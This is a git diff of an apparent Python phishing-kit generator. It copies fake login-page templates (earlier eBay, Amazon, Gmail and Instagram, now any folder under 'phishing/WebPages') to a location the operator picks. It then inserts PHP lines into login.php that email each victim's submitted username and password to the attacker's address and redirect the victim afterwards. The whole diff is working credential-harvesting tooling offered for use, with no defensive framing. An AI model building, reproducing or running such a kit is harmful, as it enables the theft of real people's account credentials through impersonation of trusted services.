@@ -1,4 +1,5 @@
 from pyfiglet import Figlet
+import terminaltables
 from shutil import copyfile
 import shutil
 import os
@@ -6,133 +7,142 @@ import os
 
 
 class website_attack():
-
     def __init__(self):
-        print("Please choose the webpage.")
-        print("")
-        print("1) Ebay")
-        print("2) Amazon")
-        print("3) gmail")
-        print("4) instagram")
+        path = "phishing/WebPages"
 
-        choosen_webside = int(input(""))
+        my_list = os.listdir(path)
 
-        if choosen_webside == 1:
-            self.ebay_attack()
-        elif choosen_webside == 2:
-            self.amazon_attack()
-        elif choosen_webside == 3:
-            self.gmail_attack()
-        elif choosen_webside == 4:
-            self.insta_attack()
+        a = 0
+        b = 1
+        c = 2
+        d = 3
+
+        x = 0
+
+        liste = [["CHOOSE", " A WEBSITE", "FOR THE", "ATTACK"]]
+
+        choose_liste = []
+
+        zeilen = len(my_list) // 4
+
+        e = 1
+        f = zeilen + 1
+        g = zeilen * 2 + 1
+        h = zeilen * 3 + 1
+
+        i = 0
+        for file_names in range(len(my_list) // 4):
+            choose_liste.append(my_list[i])
+            i = i + 4
+
+        i = 1
+        for file_names in range(len(my_list) // 4):
+            choose_liste.append(my_list[i])
+            i = i + 4
+
+        i = 2
+        for file_names in range(len(my_list) // 4):
+            choose_liste.append(my_list[i])
+            i = i + 4
+
+        i = 3
+        for file_names in range(len(my_list) // 4):
+            choose_liste.append(my_list[i])
+            i = i + 4
+
+        for z in range(zeilen):
+            liste.append([str(e) + ") " + my_list[a], str(f) + ") " + my_list[b], str(g) + ") " + my_list[c],
+                          str(h) + ") " + my_list[d]])
+            a = a + 4
+            b = b + 4
+            c = c + 4
+            d = d + 4
+
+            e = e + 1
+            f = f + 1
+            g = g + 1
+            h = h + 1
+
+        table = terminaltables.AsciiTable(liste)
+
+        print(table.table)
+
+        # print(choose_liste)
+
+        self.choosen_webside = choose_liste[int(input("Answer: ")) - 1]
+        self.phishing_email = input("Please enter your email: ")
+        self.storage_location = input("Please enter the storage location: ")
+        self.redirect_location = input("Please enter the redirect location (for default type: d): ")
 
 
-    def ebay_attack(self):
-        phishing_email = input("Please enter your email: ")
-        storage_location = input("Please enter the storage location: ")
-        redirect_location = input("Please enter the redirect location (for default type: d): ")
+        self.generate_files(self.choosen_webside)
 
-        shutil.copytree('phishing/ebay/', storage_location)
-
-
-        path = storage_location + "/modify.php"
-
+    def replace_string_in_file(self, filename, inputstring, outputstring):
         # Read in the file
-        with open(path, 'r') as file:
+        with open(filename, 'r') as file:
             filedata = file.read()
 
         # Replace the target string
-        filedata = filedata.replace('someone@example.com', phishing_email)
-
-        if redirect_location != "d":
-            filedata = filedata.replace('https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=http%3A%2F%2Fwww.ebay.com%2F', redirect_location)
+        filedata = filedata.replace(inputstring, outputstring)
 
         # Write the file out again
-        with open(path, 'w') as file:
+        with open(filename, 'w') as file:
             file.write(filedata)
 
-        print("Complete...")
+    def insert_line(self, filename, insert_pos, line):
+        """
+        Fügt der angegebenen Datei oberhalb der angegebenen Position die
+        Zeile hinzu. Diese Funktion sollte nicht für große Dateien (50 MB)
+        verwendet werden.
+        """
 
-    def amazon_attack(self):
+        # Datei zum Lesen öffnen und alle Zeilen in eine Liste einlesen
+        f = open(filename, "r")
+        lines = f.readlines()
+        f.close()
 
-        phishing_email = input("Please enter your email: ")
-        storage_location = input("Please enter the storage location: ")
-        redirect_location = input("Please enter the redirect location (for default type: d): ")
+        # Wenn die Zeile nicht mit einem Zeilenumbruch endet, dann wird dieser
+        # hinzugefügt.
+        if not line.endswith("\n"):
+            line += "\n"
 
-        shutil.copytree('phishing/amazon/', storage_location)
+        # Der Liste die neue Zeile hinzufügen
+        lines.insert(insert_pos, line)
 
-
-        path = storage_location + "/validate.php"
-
-        # Read in the file
-        with open(path, 'r') as file:
-            filedata = file.read()
-
-        # Replace the target string
-        filedata = filedata.replace('someone@example.com', phishing_email)
-
-        if redirect_location != "d":
-            filedata = filedata.replace('https://www.amazon.com/dp/B01E6AO69U/ref=ods_gw_ha_d_white?pf_rd_p=4a14e6ce-9ad7-4d30-8874-2e112490a43e&pf_rd_r=E58SKPFF5RA13KW7JQ3M', redirect_location)
-
-        # Write the file out again
-        with open(path, 'w') as file:
-            file.write(filedata)
-
-        print("Complete...")
-
-    def gmail_attack(self):
-
-        phishing_email = input("Please enter your email: ")
-        storage_location = input("Please enter the storage location: ")
-        redirect_location = input("Please enter the redirect location (for default type: d): ")
-
-        shutil.copytree('phishing/gmail/', storage_location)
+        # Speichern
+        f = open(filename, "w")
+        f.writelines(lines)
+        f.close()
 
 
-        path = storage_location + "/redirect.php"
-
-        # Read in the file
-        with open(path, 'r') as file:
-            filedata = file.read()
-
-        # Replace the target string
-        filedata = filedata.replace('someone@example.com', phishing_email)
-
-        if redirect_location != "d":
-            filedata = filedata.replace('https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view', redirect_location)
-
-        # Write the file out again
-        with open(path, 'w') as file:
-            file.write(filedata)
-
-        print("Complete...")
-
-    def insta_attack(self):
-
-        phishing_email = input("Please enter your email: ")
-        storage_location = input("Please enter the storage location: ")
-        redirect_location = input("Please enter the redirect location (for default type: d): ")
-
-        shutil.copytree('phishing/instagram/', storage_location)
+    def generate_files(self, website):
+        path_to_copy = 'phishing/WebPages/' + website
+        shutil.copytree(path_to_copy, self.storage_location)
 
 
-        path = storage_location + "/login.php"
+        email_address = self.phishing_email
+        header_location = self.redirect_location
 
-        # Read in the file
-        with open(path, 'r') as file:
-            filedata = file.read()
+        mail_to_string = '$mail_to = "' + email_address + '";'
+        mail_message_string = "$msg = $_POST['username'] . '    ' . $_POST['password'];"
+        mail_send_string = 'mail($mail_to,"Phishing",$msg) or die("unable to send email");'
 
-        # Replace the target string
-        filedata = filedata.replace('someone@example.com', phishing_email)
+        # print(mail_to_string)
+        # print(mail_message_string)
+        # print(mail_send_string)
 
-        if redirect_location != "d":
-            filedata = filedata.replace('https://instagram.com', redirect_location)
+        file_location = self.storage_location + "/login.php"
 
-        # Write the file out again
-        with open(path, 'w') as file:
-            file.write(filedata)
+        self.insert_line(file_location, 3, mail_to_string)
+        self.insert_line(file_location, 4, mail_message_string)
+        self.insert_line(file_location, 5, mail_send_string)
+        self.insert_line(file_location, 6, " ")
 
-        print("Complete...")
+        self.replace_string_in_file(file_location, "<CUSTOM>", header_location)
+        self.replace_string_in_file(file_location, "include 'ip.php';", "")
+
+
+
 
 
 
